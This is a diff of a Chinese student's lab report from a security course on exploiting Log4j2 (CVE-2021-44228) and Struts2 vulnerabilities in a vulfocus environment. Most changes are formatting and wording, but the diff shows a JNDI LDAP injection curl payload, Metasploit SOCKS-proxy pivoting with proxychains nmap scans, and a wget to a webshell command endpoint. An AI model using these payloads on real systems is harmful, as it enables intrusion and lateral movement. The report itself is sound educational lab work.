@@ -1,10 +1,14 @@
-# 2023网安暑期攻防实验记录
+# 2023网安暑期攻防实验记录📔
 
 🚩**记录2023网安暑期攻防小学期实验**
+
+课程资料：
 
 - 课程Wiki：[2023年 - 传媒网安教学 Wiki (c4pr1c3.github.io)](https://c4pr1c3.github.io/cuc-wiki/cp/2023/index.html)
 - 课程视频：[[网络安全(2021) 综合实验]](https://www.bilibili.com/video/BV1p3411x7da?p=19&vd_source=640d60cfe2696fffb930fdf01e0aba1d)
 - 视频配套课件地址:[网络安全 (c4pr1c3.github.io)](https://c4pr1c3.github.io/cuc-ns-ppt/vuls-awd.md.v4.html#/漏洞原理详解)
+
+学习过程：[学习记录](./课程学习笔记.md)
 
 ## 一、实验环境
 
@@ -161,13 +165,13 @@ systemctl start ssh
 
 - 5.评估漏洞利用效果
 
-### 实验一、命令执行-Log4j2远程命令执行
+### 1️⃣实验一、命令执行-Log4j2远程命令执行
 
 **（CVE-2021-44228）**
 
 #### 漏洞简介
 
-Apache Log4j2 是一个基于 Java 的日志记录工具。该工具重写了 Log4j 框架，并且引入了大量丰富的特性。该日志框架被大量用于业务系统开发，用来记录日志信息。 在大多数情况下，开发者可能会将用户输入导致的错误信息写入日志中。攻击者利用此特性可通过该漏洞构造特殊的数据请求包，最终触发远程代码执行。
+> Apache Log4j2 是一个基于 Java 的日志记录工具。该工具重写了 Log4j 框架，并且引入了大量丰富的特性。该日志框架被大量用于业务系统开发，用来记录日志信息。 在大多数情况下，开发者可能会将用户输入导致的错误信息写入日志中。攻击者利用此特性可通过该漏洞构造特殊的数据请求包，最终触发远程代码执行。
 
 #### 实验过程
 
@@ -250,11 +254,13 @@ curl -X POST http://192.168.56.108:54307/hello -d 'payload="${jndi:ldap://0o9zuq
 
 在网上查询了一下报错原因：[(100条消息) Request method ‘POST‘ not supported Method Not Allowed_cy谭的博客-CSDN博客](https://blog.csdn.net/zhan107876/article/details/111595338)
 
-也在不同的虚拟机和不同电脑的虚拟机进行了实验，我认为应该是搭建的vulfocus现在的版本的问题，GET请求是可以正常进行的，curl也能成功访问到网站，但是不能用curl命令发送POST请求。
+带着这个报错我也在不同的虚拟机和不同电脑的虚拟机进行了实验，也是相同的问题。
 
-以下是使用Burpsuite手动发送POST请求👇
+我认为应该是搭建的vulfocus现在的版本和docker或者虚拟机的兼容问题，也可能是网络问题，试了一下GET请求是可以正常进行的，返回ok，curl也能成功访问到网站，但是不能用curl命令发送POST请求。
 
 ###### Burpsuite
+
+以下是使用Burpsuite手动发送POST请求过程👇
 
 使用Burpsuite进行抓包：
 
@@ -331,7 +337,7 @@ requests.exceptions.ConnectionError: HTTPSConnectionPool(host='interact.sh', por
 
   - 也可能是程序请求速度过快。
 
-- 暂时还没有好的解救办法
+- 暂时还没有好的解决办法
 
 ##### 4. log4j2评估漏洞利用效果
 
@@ -470,7 +476,7 @@ suricata
 
 ![](IMG/log4j2_attack.png)
 
-### 实验二、跨网段多靶标渗透场景攻防
+### 2️⃣实验二、跨网段多靶标渗透场景攻防
 
 **CVE-2020-17530 Struts2**
 
@@ -796,6 +802,17 @@ set threads 10
 
 ![image-20230726203925251](IMG/services2.png)
 
+搜索 `socks_proxy`，使用该代理模块，该代理模块就能在攻击者主机上开启一个利用当前立足点会话建立起的一个跳板
+
+```shell
+# setup socks5 proxy 
+$ search socks_proxy
+$ use auxiliary/server/socks_proxy
+$ run -j
+# 查看后台任务
+$ jobs -l
+```
+
 新开一个 ssh 会话窗口 ：检查 1080 端口服务开放情况 
 
 ```shell
@@ -803,6 +820,14 @@ sudo lsof -i tcp:1080 -l -n -P
 ```
 
 ![image-20230726204324412](IMG/检查 1080 端口服务开放情况 .png)
+
+- 编辑 `/etc/proxychains4.conf`，进行 tcp 连接扫描 `7001` 端口；虽然扫描输出的结果是 `filtered`，但其实是处于开放状态的
+
+  ```shell
+  $ sudo sed -i.bak -r "s/socks4\s+127.0.0.1\s+9050/socks5 127.0.0.1 1080/g" /etc/proxychains4.conf
+  
+  $ proxychains sudo nmap -vv -n -p 7001 -Pn -sT 192.170.84.2-5
+  ```
 
 回到 metasploit 会话窗口:重新进入 shell 会话 
 
@@ -870,7 +895,7 @@ flag4:
 
 #### 8.攻破最终靶标5
 
-通过网卡、路由、ARP 发现新子网 192.169.85.0/24:
+由搭建的场景可知，有一台靶机是双网卡的，我们需要找到那台有双网卡的靶机，通过网卡、路由、ARP 发现新子网 192.169.85.0/24:
 
 ```shell
 sessions -c "ifconfig" -i 3,4,5
@@ -931,9 +956,9 @@ shell
 wget "http://192.169.85.2/index.php?cmd=ls /tmp" -O /tmp/result && cat /tmp/result
 ```
 
-因为扫描不到192.169.85.2 导致得不到最终flag
+因为扫描不到192.169.85.2:80 导致得不到最终flag
 
-## 报错解决
+## 报错解决❌
 
 ### 1.[Ubuntu](https://so.csdn.net/so/search?q=Ubuntu&spm=1001.2101.3001.7020)换源error
 
@@ -957,7 +982,7 @@ The following signatures couldn’t be verified because the public key is not av
 
 [Metasploit渗透测试中出的错误 Exploit failed bad-config\]: Rex::BindFailed The address is already in use_木森czy的博客-CSDN博客](https://blog.csdn.net/weixin_41023533/article/details/121337503)
 
-## 参考链接
+## 参考链接🔗
 
 https://www.govcert.admin.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/
 
